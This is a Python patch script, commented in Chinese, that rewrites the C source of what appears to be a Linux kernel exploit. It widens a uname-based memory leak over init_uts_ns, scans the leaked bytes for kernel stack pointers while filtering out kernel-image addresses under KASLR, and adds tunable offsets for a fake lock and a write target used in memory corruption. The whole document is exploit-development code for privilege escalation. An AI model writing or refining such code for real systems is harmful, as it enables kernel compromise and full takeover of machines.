# -*- coding: utf-8 -*-
"""stackreuse 支撑补丁:
1) read_sysname 改成 dump 整个 init_uts_ns.name(5*65=0x145 字节) ⇒ 可以用 uts 里更多的零段;
2) 所有存 hex 的缓冲从 256 放大到 1024;
3) leaked_stack: 扫全长, 并且**排除落在内核镜像区间里的指针**(那是 T=root->rb_node, 不是栈),
   把每个候选都打出来 ⇒ 才能区分"每一次调用泄漏到的 S";
4) 加 lk=/tg= 两个偏移旋钮(假 lock / 写目标 T 在 init_uts_ns 内的偏移), 让每次进程调用换一块洞。
"""
import io

p = 'pr.c'
s = io.open(p, encoding='utf-8').read()

# ---- 1) 全 name 块 dump ----
old = r'''  unsigned char *raw = (unsigned char *)u.sysname;
  size_t o = 0;
  for (int i = 0; i < 96 && o + 3 < n; i++) o += (size_t)snprintf(hex + o, n - o, "%02x", raw[i]);'''
new = r'''  unsigned char *raw = (unsigned char *)&u;      /* struct utsname = 5×65 字节连续 */
  int lim = (int)((n - 1) / 2);
  if (lim > 0x145) lim = 0x145;                  /* uts+0x04 .. uts+0x148 */
  size_t o = 0;
  for (int i = 0; i < lim && o + 3 < n; i++) o += (size_t)snprintf(hex + o, n - o, "%02x", raw[i]);'''
assert old in s
s = s.replace(old, new)

# ---- 2) 缓冲放大 ----
for a, b in (('static char name_hex_before[256], name_hex_after[256];',
              'static char name_hex_before[1024], name_hex_after[1024];'),
             ('  char prev[256];', '  char prev[1024];'),
             ('    char cur[256];', '    char cur[1024];'),
             ('    char cur[256], p0name[256];', '    char cur[1024], p0name[1024];'),
             ('        char nm2[256];', '        char nm2[1024];')):
    assert a in s, a
    s = s.replace(a, b)
s = s.replace('  strcpy(prev, cur);', '  memcpy(prev, cur, strlen(cur) + 1);')

# ---- 3) leaked_stack 全长 + 排除镜像区间 ----
old3 = r'''  if (strlen(hex) < 192) return 0;'''
new3 = r'''  int L = (int)(strlen(hex) / 2);
  if (L < 40) return 0;'''
assert old3 in s
s = s.replace(old3, new3)
old4 = r'''  for (int b = 0; b + 8 <= 96; b += 4) {
    uintptr_t v = hexq(hex, b);
    if ((v >> 40) == 0xffffffULL || (v >> 48) == 0xffffULL) {
      if (v != 0 && (v & 7) == 0) { say("[scan] name+%d = %016lx\n", b, (unsigned long)v); return v; }
    }
  }
  return 0;'''
new4 = r'''  uintptr_t im0 = LK_TEXT_BASE + SLIDE, im1 = im0 + 0x1C00000;   /* text..data..bss 全算镜像 */
  for (int b = 0; b + 8 <= L; b += 4) {
    uintptr_t v = hexq(hex, b);
    if (v == 0 || (v & 7) != 0) continue;
    if ((v >> 40) != 0xffffffULL && (v >> 48) != 0xffffULL) continue;
    if (v >= im0 && v < im1) { say("[scan] name+%d = %016lx (镜像内: 那是 root->rb_node=T, 忽略)\n",
                                    b, (unsigned long)v); continue; }
    say("[scan] name+%d = %016lx  <== 候选 S(非镜像)\n", b, (unsigned long)v);
    return v;
  }
  return 0;'''
assert old4 in s
s = s.replace(old4, new4)

# ---- 4) lk=/tg= 旋钮 + SHAPE=2 用 FAKE_TGT ----
s = s.replace('#define UTS_TGT_OFF    0x38          /* = UTS_LOCK_OFF + 0x18 */',
              '#define UTS_TGT_OFF    0x08          /* 写目标 T = uts+0x08 (sysname 里可读回) */')
s = s.replace('static int HAMMER = 0;',
              'static int LK_OFF = 0x20, TG_OFF = 0x08;   /* 假lock / 写目标T 在 init_uts_ns 内的偏移 */\n'
              'static int HAMMER = 0;')
s = s.replace('''    } else if (!strncmp(argv[i], "dst=", 4)) {''',
              '''    } else if (!strncmp(argv[i], "lk=", 3)) {
      LK_OFF = (int)strtol(argv[i] + 3, NULL, 0);
    } else if (!strncmp(argv[i], "tg=", 3)) {
      TG_OFF = (int)strtol(argv[i] + 3, NULL, 0);
    } else if (!strncmp(argv[i], "dst=", 4)) {''')
s = s.replace('''  FAKE_LOCK = LK_INIT_UTS + UTS_LOCK_OFF + SLIDE;
  FAKE_TGT  = LK_INIT_UTS + UTS_TGT_OFF + SLIDE;''',
              '''  FAKE_LOCK = LK_INIT_UTS + LK_OFF + SLIDE;   /* rb_node 落在 lock+0x08, leftmost 落在 lock+0x10 */
  FAKE_TGT  = LK_INIT_UTS + TG_OFF + SLIDE;''')
old5 = '    w[1] = LK_UTS + SLIDE + 0x08;          /* T = name.sysname 的对齐首字 */'
assert old5 in s
s = s.replace(old5, '    w[1] = FAKE_TGT;                     /* T = 可读回的对齐零格 */')
io.open(p, 'w', encoding='utf-8').write(s)
print('ok')
